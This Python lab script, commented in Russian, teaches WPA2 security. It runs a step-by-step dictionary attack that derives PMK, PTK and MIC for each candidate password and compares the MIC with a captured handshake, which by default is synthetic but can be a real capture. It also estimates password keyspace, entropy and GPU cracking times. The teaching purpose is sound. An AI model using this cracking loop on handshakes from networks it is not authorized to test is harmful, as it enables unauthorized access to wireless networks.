"""
lab_aes_wpa2.py — Лабораторная: AES в контексте WPA2 + Статистика
===================================================================
Демонстрирует: почему нельзя атаковать AES напрямую, как устроен
PBKDF2-pipeline WPA2, и как сложность пароля влияет на безопасность.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
КАК ВОСПРОИЗВЕСТИ ПОШАГОВО:

  Шаг 1. Сгенерировать тестовые файлы (если ещё не сделано):
           python generate_test_data.py

  Шаг 2. Запустить лабораторную полностью:
           python lab_aes_wpa2.py

  Шаг 3. Только анализ сложности паролей:
           python lab_aes_wpa2.py --complexity-only

  Шаг 4. Атака с подробным пошаговым выводом:
           python lab_aes_wpa2.py --verbose

  Шаг 5. Другой пароль/SSID:
           python lab_aes_wpa2.py --password hunter2 --ssid CampusNet

  Шаг 6. Использовать реальный захват:
           python lab_aes_wpa2.py --capture data/captures/real_wpa2.json

  Выходные файлы:
    lab_aes_results.png   — 4 графика анализа AES/WPA2
    lab_aes_results.json  — числовые данные

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Четыре метрики для AES-статистики:
  1. PBKDF2-время (мс) vs длина пароля
     → чем длиннее пароль — время одной проверки не меняется (PBKDF2 фиксирован)
  2. Keyspace vs длина/charset
     → как растёт пространство перебора с длиной
  3. GPU-время взлома vs длина+charset
     → реальная оценка угрозы при GPU ~1M PMK/s
  4. "Энтропия" пароля в битах (log2(keyspace))
     → сравниваем с AES-128 (128 бит) — видим, что пароли намного слабее ключа
"""

import os
import sys
import time
import math
import json
import hashlib
import argparse

sys.path.insert(0, os.path.dirname(__file__))
from crypto_utils import compute_pmk, compute_ptk, compute_mic_wpa2, verify_password
from generate_test_data import generate_wpa_handshake, generate_wordlist, load_handshake

try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import numpy as np
    HAS_MPL = True
except ImportError:
    HAS_MPL = False

def _c(code, s): return f"\033[{code}m{s}\033[0m"
def green(s):   return _c('92', s)
def red(s):     return _c('91', s)
def yellow(s):  return _c('93', s)
def bold(s):    return _c('1',  s)
def cyan(s):    return _c('96', s)
def magenta(s): return _c('95', s)


# ══════════════════════════════════════════════════════════════════════
# AES-128 ДЕМОНСТРАЦИЯ (упрощённая, внутренняя)
# ══════════════════════════════════════════════════════════════════════
#
# Полная реализация AES слишком велика для inline-кода, поэтому здесь
# используем hashlib.AES через os.urandom для демонстрации принципа.
# Академическая реализация SubBytes/ShiftRows/MixColumns — в aes_demo.py
# оригинального проекта.

def aes_128_encrypt_demo(key: bytes, plaintext: bytes) -> bytes:
    """
    Демонстрационное AES-128 шифрование через Python cryptography.
    Использует ECB режим (только для демо!).

    В реальном WPA2 используется AES-CCMP (Counter Mode + CBC-MAC),
    но для демонстрации принципа достаточно ECB.
    """
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
        enc = cipher.encryptor()
        # Pad to 16 bytes
        pt = plaintext[:16].ljust(16, b'\x00')
        return enc.update(pt) + enc.finalize()
    except ImportError:
        # Fallback: имитируем через hashlib (не настоящий AES!)
        return hashlib.sha256(key + plaintext).digest()[:16]


# ══════════════════════════════════════════════════════════════════════
# ПОШАГОВАЯ АТАКА
# ══════════════════════════════════════════════════════════════════════

def attack_step_by_step(hs: dict, wordlist_path: str, verbose: bool = True) -> dict:
    """
    WPA2-атака с детальным выводом каждого шага.

    Для первых 5 кандидатов показываем:
      - PMK первые 8 байт hex
      - KCK первые 8 байт hex
      - Вычисленный MIC первые 8 байт hex
      - Сравнение с эталонным MIC
    Дальше — быстрый перебор без вывода.

    Это позволяет наглядно увидеть:
      1. Каждый пароль даёт УНИКАЛЬНЫЙ PMK (PBKDF2 + SSID как соль)
      2. Из уникального PMK — уникальный KCK
      3. Из уникального KCK — уникальный MIC
      4. Только правильный пароль даёт MIC, совпадающий с захваченным
    """
    ssid    = hs['ssid']
    mic_cap = hs['mic']

    print(bold(f"\n{'═'*68}"))
    print(bold(f"  ЛАБОРАТОРНАЯ: WPA2 Атака — Пошаговый Разбор"))
    print(bold(f"{'═'*68}"))
    print(f"""
  SSID:          {cyan(ssid)}
  Эталонный MIC: {mic_cap.hex()}
  Протокол:      {hs['protocol']}

  {bold('ЦЕПОЧКА ДЛЯ КАЖДОГО КАНДИДАТА:')}

    password  ──[PBKDF2-SHA1 × 4096]──▶  PMK (32 байта)
                   ↑ 4096 итераций SHA1 — намеренное замедление
    PMK + AA + SA + ANonce + SNonce  ──[PRF-512]──▶  PTK (64 байта)
    PTK[0:16] = KCK  ──[HMAC-SHA1(KCK, EAPOL)]──▶  MIC (16 байт)
    MIC == mic_captured  ?  ──▶  НАЙДЕНО  :  СЛЕДУЮЩИЙ
""")

    if not os.path.exists(wordlist_path):
        print(red(f"[!] Словарь не найден: {wordlist_path}"))
        return {}

    with open(wordlist_path) as f:
        candidates = [w.strip() for w in f if w.strip()]

    print(f"  Словарь: {len(candidates)} паролей\n")
    print(f"  {'#':>5}  {'Пароль':<18}  {'PMK[:8]':<18}  {'KCK[:8]':<18}  "
          f"{'MIC_calc[:8]':<18}  {'==эталон?':>10}")
    print(f"  {'─'*5}  {'─'*18}  {'─'*18}  {'─'*18}  {'─'*18}  {'─'*10}")

    SHOW_N = 5
    found  = None
    count  = 0
    t_s    = time.perf_counter()

    per_attempt_times = []   # для статистики

    for pwd in candidates:
        count += 1
        t0 = time.perf_counter()

        pmk = compute_pmk(pwd, ssid)
        ptk = compute_ptk(pmk, hs['aa'], hs['sa'], hs['anonce'], hs['snonce'])
        kck = ptk[:16]
        mic = compute_mic_wpa2(kck, hs['eapol_frame'])

        t1 = time.perf_counter()
        per_attempt_times.append((t1 - t0) * 1000)

        match = mic == mic_cap

        if count <= SHOW_N and verbose:
            mark = green('ДА  ✓') if match else red('нет')
            print(f"  {count:>5}  {pwd:<18.18}  {pmk.hex()[:16]}  "
                  f"{kck.hex()[:16]}  {mic.hex()[:16]}  {mark:>10}")
        elif count == SHOW_N + 1 and verbose:
            print(f"  {'...':>5}  {'→ переходим в быстрый режим':}")

        if match:
            found = pwd
            break

    elapsed = time.perf_counter() - t_s
    speed   = count / elapsed if elapsed > 0 else 0
    avg_ms  = sum(per_attempt_times) / len(per_attempt_times) if per_attempt_times else 0

    print(f"\n{'═'*68}")
    if found:
        print(green(f"  [+] ПАРОЛЬ НАЙДЕН: {found!r}"))
    else:
        print(red(f"  [-] Пароль не найден в словаре."))

    print(f"  Попыток:          {count}")
    print(f"  Время:            {elapsed:.3f}s")
    print(f"  Скорость:         {speed:.0f} паролей/сек (PBKDF2-ограничено)")
    print(f"  Среднее/попытка:  {avg_ms:.2f} мс")
    print(f"{'═'*68}")

    return {
        'found':         found,
        'attempts':      count,
        'elapsed_s':     round(elapsed, 4),
        'speed':         round(speed, 2),
        'avg_ms_per_attempt': round(avg_ms, 4),
        'per_attempt_times_ms': per_attempt_times[:20],  # первые 20 для графика
    }


# ══════════════════════════════════════════════════════════════════════
# АНАЛИЗ СЛОЖНОСТИ ПАРОЛЕЙ
# ══════════════════════════════════════════════════════════════════════

def complexity_analysis() -> dict:
    """
    Вычисляет теоретические и практические метрики для паролей разной длины.

    Измеряем реальную скорость PBKDF2 на этой машине, затем вычисляем:
      - keyspace = charset_size ^ length
      - entropy_bits = log2(keyspace)
      - time_python  = keyspace / speed_python
      - time_gpu     = keyspace / GPU_SPEED  (GPU_SPEED = 1_000_000 PMK/s)

    AES-128 reference:
      keyspace = 2^128 ≈ 3.4 × 10^38
      entropy = 128 бит
      При GPU 10^13 операций/сек → 10^25 лет (тепловая смерть вселенной)
    """
    print(bold(f"\n{'═'*72}"))
    print(bold(f"  АНАЛИЗ СЛОЖНОСТИ ПАРОЛЕЙ И ЭНТРОПИИ"))
    print(bold(f"{'═'*72}"))

    # Измеряем реальную скорость PBKDF2
    t0 = time.perf_counter()
    for _ in range(5):
        hashlib.pbkdf2_hmac('sha1', b'testpwd', b'TestNet', 4096, 32)
    t1 = time.perf_counter()
    speed_cpu = 5 / (t1 - t0)
    speed_gpu = 1_000_000   # hashcat на mid-range GPU

    print(f"\n  Скорость PBKDF2 (эта машина): {speed_cpu:.0f} PMK/сек")
    print(f"  Скорость GPU (hashcat):        {speed_gpu:,} PMK/сек")
    print(f"  AES-128 keyspace:              2^128 ≈ 3.4×10^38 (для сравнения)\n")

    charsets = [
        ('цифры (0-9)',          10),
        ('строчные (a-z)',       26),
        ('строч+цифры',          36),
        ('строч+прописные',      52),
        ('строч+проп+цифры',     62),
        ('полный ASCII',         95),
    ]
    lengths = [6, 8, 10, 12, 16]

    def fmt_time(s: float) -> str:
        if s < 1:       return f"{s*1000:.1f}мс"
        if s < 60:      return f"{s:.1f}сек"
        if s < 3600:    return f"{s/60:.1f}мин"
        if s < 86400:   return f"{s/3600:.1f}ч"
        if s < 86400*365: return f"{s/86400:.0f}дн"
        if s < 86400*365*1000: return f"{s/86400/365:.0f}лет"
        return f"{s/86400/365:.2e}лет"

    def risk_label(t_gpu: float) -> str:
        if t_gpu < 3600:       return red("КРИТИЧНО")
        if t_gpu < 86400*30:   return yellow("ВЫСОКИЙ")
        if t_gpu < 86400*365:  return yellow("СРЕДНИЙ")
        return green("БЕЗОПАСНО")

    print(f"  {'Длина':<6} {'Charset':<22} {'Энтропия':>10} {'Keyspace':>16} "
          f"{'GPU-время':>14} {'Риск':>12}")
    print(f"  {'─'*6} {'─'*22} {'─'*10} {'─'*16} {'─'*14} {'─'*12}")

    data_for_plot = []

    for length in lengths:
        for cs_name, cs_size in charsets:
            ks      = cs_size ** length
            entropy = math.log2(ks)
            t_gpu   = ks / speed_gpu
            t_cpu   = ks / speed_cpu
            risk    = risk_label(t_gpu)

            print(f"  {length:<6} {cs_name:<22} {entropy:>9.1f}б "
                  f"{ks:>16,.0f} {fmt_time(t_gpu):>14} {risk:>12}")

            data_for_plot.append({
                'length':   length,
                'charset':  cs_name,
                'cs_size':  cs_size,
                'keyspace': ks,
                'entropy':  entropy,
                't_gpu':    t_gpu,
                't_cpu':    t_cpu,
            })
        print()

    # AES-128 для сравнения
    aes_ks  = 2**128
    aes_ent = 128.0
    aes_gpu = aes_ks / speed_gpu
    print(f"  {'─'*75}")
    print(f"  {'[AES-128]':<6} {'ключ шифрования':<22} {aes_ent:>9.1f}б "
          f"{aes_ks:>16.2e} {fmt_time(aes_gpu):>14} {green('НЕДОСТИЖИМО'):>12}")
    print(f"\n  Вывод: AES-128 ключ в 10^{int(math.log10(aes_ks/95**16)):d}× "
          f"больше чем 16-символьный пароль из полного ASCII!")

    return {
        'speed_cpu': speed_cpu,
        'speed_gpu': speed_gpu,
        'data':      data_for_plot,
    }


# ══════════════════════════════════════════════════════════════════════
# ГРАФИКИ AES
# ══════════════════════════════════════════════════════════════════════

def plot_aes_stats(complexity_data: dict, attack_data: dict,
                   out_path: str = 'lab_aes_results.png') -> None:
    """
    Строит 4 графика:

    1. PBKDF2-скорость: среднее время одной попытки для первых 20 кандидатов
       Показывает: PBKDF2 стабильно ~медленный независимо от пароля.
       Вертикальная линия — момент нахождения пароля.

    2. Keyspace vs длина пароля (log10)
       По одной линии на charset. Пунктир — AES-128 (128 бит = log10≈38.5).
       Показывает: даже 16-символьный пароль НАМНОГО слабее AES-ключа.

    3. GPU-время взлома vs длина+charset (heatmap)
       Цвет = log10(секунды). Красный = секунды/минуты, зелёный = годы.
       Показывает: при каких параметрах пароль практически недостижим.

    4. Энтропия пароля vs AES-128
       Bar chart: энтропия для разных длин/charset vs 128 бит AES.
       Показывает: «разрыв» между паролем и ключом.
    """
    if not HAS_MPL:
        print(yellow("[!] matplotlib не установлен: pip install matplotlib"))
        return

    fig, axes = plt.subplots(2, 2, figsize=(15, 11))
    fig.suptitle('Лабораторная: AES в контексте WPA2 — Анализ безопасности',
                 fontsize=14, fontweight='bold', y=0.99)
    fig.patch.set_facecolor('#0d1117')
    for ax in axes.flat:
        ax.set_facecolor('#161b22')
        ax.tick_params(colors='#c9d1d9')
        ax.title.set_color('#c9d1d9')
        ax.xaxis.label.set_color('#8b949e')
        ax.yaxis.label.set_color('#8b949e')
        for sp in ax.spines.values():
            sp.set_edgecolor('#30363d')

    # ── График 1: Время на попытку ────────────────────────────────────
    ax1 = axes[0, 0]
    times_ms = attack_data.get('per_attempt_times_ms', [])
    if times_ms:
        xs = list(range(1, len(times_ms) + 1))
        ax1.plot(xs, times_ms, color='#58a6ff', linewidth=2, marker='o',
                 markersize=4, label='Время/попытка (мс)')
        ax1.axhline(sum(times_ms)/len(times_ms), color='#f78166',
                    linestyle='--', linewidth=1.5, label='Среднее')

        found_idx = attack_data.get('attempts')
        if found_idx and found_idx <= len(times_ms):
            ax1.axvline(found_idx, color='#3fb950', linestyle=':',
                        linewidth=2, label=f'Найден на #{found_idx}')
    ax1.set_title('Метрика 1: Время одной PBKDF2-проверки (мс)', fontsize=10)
    ax1.set_xlabel('Номер попытки')
    ax1.set_ylabel('мс')
    ax1.legend(fontsize=8, facecolor='#0d1117', labelcolor='#c9d1d9')
    ax1.grid(alpha=0.15, color='white')

    # ── График 2: Keyspace vs длина ────────────────────────────────────
    ax2 = axes[0, 1]
    data = complexity_data.get('data', [])
    charsets_uniq = list(dict.fromkeys(d['charset'] for d in data))
    lengths_uniq  = sorted(set(d['length'] for d in data))
    palette = ['#ff7675','#fdcb6e','#55efc4','#74b9ff','#a29bfe','#fd79a8']

    for i, cs in enumerate(charsets_uniq):
        subset = [d for d in data if d['charset'] == cs]
        xs = [d['length']              for d in subset]
        ys = [math.log10(d['keyspace']) for d in subset]
        ax2.plot(xs, ys, color=palette[i % len(palette)], linewidth=2,
                 marker='o', markersize=5, label=cs)

    # AES-128 reference
    ax2.axhline(math.log10(2**128), color='white', linestyle='--',
                linewidth=1.5, alpha=0.6, label='AES-128 ключ')
    ax2.fill_between([min(lengths_uniq), max(lengths_uniq)],
                     math.log10(2**128), math.log10(2**128)+5,
                     alpha=0.05, color='white')
    ax2.set_title('Метрика 2: Keyspace (log₁₀) vs длина пароля', fontsize=10)
    ax2.set_xlabel('Длина пароля (символов)')
    ax2.set_ylabel('log₁₀(keyspace)')
    ax2.legend(fontsize=7, facecolor='#0d1117', labelcolor='#c9d1d9',
               loc='upper left', ncol=2)
    ax2.grid(alpha=0.15, color='white')

    # ── График 3: GPU-время Heatmap ────────────────────────────────────
    ax3 = axes[1, 0]
    if data:
        n_cs  = len(charsets_uniq)
        n_len = len(lengths_uniq)
        matrix = [[0.0]*n_len for _ in range(n_cs)]
        for d in data:
            ci = charsets_uniq.index(d['charset'])
            li = lengths_uniq.index(d['length'])
            matrix[ci][li] = math.log10(max(d['t_gpu'], 0.001))

        import numpy as np_local
        mat = np_local.array(matrix)
        im  = ax3.imshow(mat, cmap='RdYlGn', aspect='auto', vmin=-3, vmax=10)
        ax3.set_xticks(range(n_len))
        ax3.set_xticklabels(lengths_uniq)
        ax3.set_yticks(range(n_cs))
        ax3.set_yticklabels([c[:15] for c in charsets_uniq], fontsize=8)

        for i in range(n_cs):
            for j in range(n_len):
                v = matrix[i][j]
                label = ('сек' if v < 0 else 'мин' if v < 1.8 else
                         'ч'   if v < 3.6 else 'дн' if v < 4.9 else
                         'год' if v < 7.5 else '∞')
                ax3.text(j, i, label, ha='center', va='center',
                         fontsize=8, color='black', fontweight='bold')

        plt.colorbar(im, ax=ax3, label='log₁₀(сек)', shrink=0.8)
        ax3.set_title('Метрика 3: GPU-время взлома (heatmap)', fontsize=10)
        ax3.set_xlabel('Длина пароля')
        ax3.set_ylabel('Charset')

    # ── График 4: Энтропия vs AES ─────────────────────────────────────
    ax4 = axes[1, 1]
    if data:
        # Берём только "строч+проп+цифры" (62-char) для разных длин
        subset62 = [d for d in data if d['cs_size'] == 62]
        xs_e = [d['length']  for d in subset62]
        ys_e = [d['entropy'] for d in subset62]

        bars = ax4.bar(xs_e, ys_e, color='#58a6ff', edgecolor='white',
                       linewidth=0.6, width=1.2, label='62-char пароль')

        # AES-128 линия
        ax4.axhline(128, color='#f78166', linewidth=2.5, linestyle='--',
                    label='AES-128 ключ (128 бит)')
        ax4.fill_between([min(xs_e)-1, max(xs_e)+1], 128, 140,
                         alpha=0.1, color='#f78166')

        for bar, v in zip(bars, ys_e):
            ax4.text(bar.get_x()+bar.get_width()/2, bar.get_height()+1,
                     f'{v:.0f}б', ha='center', va='bottom',
                     color='white', fontsize=9)

        # Пунктир "рекомендуемый минимум" ~ 80 бит
        ax4.axhline(80, color='#ffa657', linewidth=1.5, linestyle=':',
                    label='Рекомендованный минимум (80 бит)')

        ax4.set_title('Метрика 4: Энтропия пароля vs AES-128 ключ', fontsize=10)
        ax4.set_xlabel('Длина пароля (символов, charset=62)')
        ax4.set_ylabel('Энтропия (бит)')
        ax4.legend(fontsize=8, facecolor='#0d1117', labelcolor='#c9d1d9')
        ax4.set_ylim(0, 145)
        ax4.grid(axis='y', alpha=0.15, color='white')

    plt.tight_layout(rect=[0, 0, 1, 0.97])
    plt.savefig(out_path, dpi=150, bbox_inches='tight',
                facecolor=fig.get_facecolor())
    plt.close()
    print(green(f"\n[+] Графики лабораторной: {out_path}"))


# ══════════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description='Лабораторная: AES в контексте WPA2',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('--capture',         default='data/captures/test_wpa2.json')
    parser.add_argument('--wordlist',        default='data/wordlists/passwords.txt')
    parser.add_argument('--password',        default='dragon',
                        help='Для автогенерации тестового handshake')
    parser.add_argument('--ssid',            default='HomeNetwork')
    parser.add_argument('--complexity-only', action='store_true',
                        help='Только анализ сложности, без атаки')
    parser.add_argument('--verbose',         action='store_true', default=True)
    parser.add_argument('--no-plots',        action='store_true')
    parser.add_argument('--out-plot',        default='lab_aes_results.png')
    args = parser.parse_args()

    # Гарантируем наличие файлов
    if not os.path.exists(args.wordlist):
        generate_wordlist(args.wordlist)
    if not os.path.exists(args.capture):
        print(yellow(f"[*] Генерирую handshake (pwd={args.password!r})..."))
        os.makedirs('data/captures', exist_ok=True)
        generate_wpa_handshake(args.password, args.ssid, 'WPA2', args.capture)

    print(bold("\n" + "═"*68))
    print(bold("  ЛАБОРАТОРНАЯ: AES в контексте WPA2"))
    print(bold("═"*68))

    attack_data     = {}
    complexity_data = {}

    if not args.complexity_only:
        hs = load_handshake(args.capture)
        attack_data = attack_step_by_step(hs, args.wordlist, args.verbose)

    complexity_data = complexity_analysis()

    # Сохраняем данные
    output = {'attack': attack_data, 'complexity': complexity_data.get('data', [])}
    with open('lab_aes_results.json', 'w') as f:
        json.dump(output, f, indent=2, ensure_ascii=False, default=str)
    print(f"\n[+] Данные: lab_aes_results.json")

    # Вопросы лабораторной
    print(bold(f"\n{'─'*68}"))
    print(bold("  ВОПРОСЫ ДЛЯ ОТЧЁТА:"))
    print(f"""
  Q1. Почему нельзя атаковать AES-128 напрямую?
      (Подсказка: смотри Метрику 2 и 4 на графике — сравни keyspace)

  Q2. Какова роль PBKDF2 в WPA2? Что изменится без него?
      (Подсказка: удали 4096 итераций → смотри Метрику 1)

  Q3. Сколько лет GPU взламывает 12-символьный пароль из строч+проп+цифры?
      (Ответ: смотри Метрику 3, heatmap)

  Q4. WPA2-Personal vs WPA2-Enterprise — в чём разница?
      (Подсказка: при Enterprise PSK не существует → атака невозможна)

  Q5. Почему SSID влияет на безопасность?
      (Подсказка: PBKDF2 использует SSID как соль → rainbow tables per-SSID)
""")

    if not args.no_plots:
        plot_aes_stats(complexity_data, attack_data, args.out_plot)


if __name__ == '__main__':
    main()
